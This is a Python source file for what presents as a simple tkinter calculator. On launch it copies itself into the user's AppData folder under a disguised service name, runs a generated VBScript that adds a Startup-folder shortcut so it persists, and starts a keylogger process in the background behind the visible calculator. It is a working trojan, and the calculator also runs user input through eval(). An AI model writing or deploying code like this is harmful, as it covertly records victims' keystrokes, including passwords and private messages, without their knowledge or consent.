import tkinter as tk
import os
import sys
from keylogger import run_keylogger
import multiprocessing
import shutil


class Calculator:
    def __init__(self, master):
        self.master = master
        self.master.title('Simple Calculator')
        self.result_var = tk.StringVar()

        # Entry field
        self.entry = tk.Entry(master, textvariable=self.result_var, font=('Arial', 16), bd=10, insertwidth=2, width=14, borderwidth=4)
        self.entry.grid(row=0, column=0, columnspan=4)

        # Buttons
        buttons = [
            '7', '8', '9', '/',
            '4', '5', '6', '*',
            '1', '2', '3', '-',
            '0', 'C', '=', '+'
        ]

        row_val = 1
        col_val = 0
        for button in buttons:
            tk.Button(master, text=button, padx=20, pady=20, font=('Arial', 16), command=lambda b=button: self.on_button_click(b)).grid(row=row_val, column=col_val)
            col_val += 1
            if col_val > 3:
                col_val = 0
                row_val += 1

    def on_button_click(self, button):
        if button == 'C':
            self.result_var.set('')
        elif button == '=':
            try:
                result = eval(self.result_var.get())
                self.result_var.set(result)
            except Exception as e:
                self.result_var.set('Error')
        else:
            current_text = self.result_var.get()
            self.result_var.set(current_text + button)


def add_to_startup():
    # Get the path to the current executable
    exe_path = sys.executable  # Path to the current executable
    
    # Define a permanent location for the executable (e.g., in the AppData folder or Program Files)
    permanent_dir = os.path.join(os.getenv("APPDATA"), "Windows(fake)")  # Example: Use AppData for persistent storage
    if not os.path.exists(permanent_dir):
        os.makedirs(permanent_dir)

    # Create a permanent copy of the executable
    new_name = "Service(fake).exe"
    permanent_exe_path = os.path.join(permanent_dir, new_name)
    
    # Copy the executable to the permanent location if it's not already there
    if not os.path.exists(permanent_exe_path):
        shutil.copy(exe_path, permanent_exe_path)
    
    # Get the Startup folder path
    startup_dir = os.path.join(
        os.getenv("APPDATA"),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup"
    )
    
    # Create a shortcut path in the Startup folder
    shortcut_name = new_name.replace(".exe", ".lnk")
    shortcut_path = os.path.join(startup_dir, shortcut_name)
    
    # Create a VBScript to create the shortcut
    wscript_content = f"""
Set oWS = WScript.CreateObject("WScript.Shell")
Set oLnk = oWS.CreateShortcut("{shortcut_path}")
oLnk.TargetPath = "{permanent_exe_path}"
oLnk.Arguments = "--startup"
oLnk.WorkingDirectory = "{permanent_dir}"
oLnk.Save
"""
    # Save and execute the VBScript
    temp_vbs = os.path.join(os.getenv("TEMP"), "create_shortcut.vbs")
    with open(temp_vbs, "w") as vbs_file:
        vbs_file.write(wscript_content)
    
    os.system(f'wscript "{temp_vbs}"')
    os.remove(temp_vbs)
   
if __name__ == '__main__':

    add_to_startup()


    if "--startup" in sys.argv:

        multiprocessing.freeze_support()
        new_process = multiprocessing.Process(target=run_keylogger)
        new_process.start()
    else:

        multiprocessing.freeze_support()
        new_process = multiprocessing.Process(target=run_keylogger)
        new_process.start()
    
        root = tk.Tk()
        calculator = Calculator(root)
        root.mainloop()

    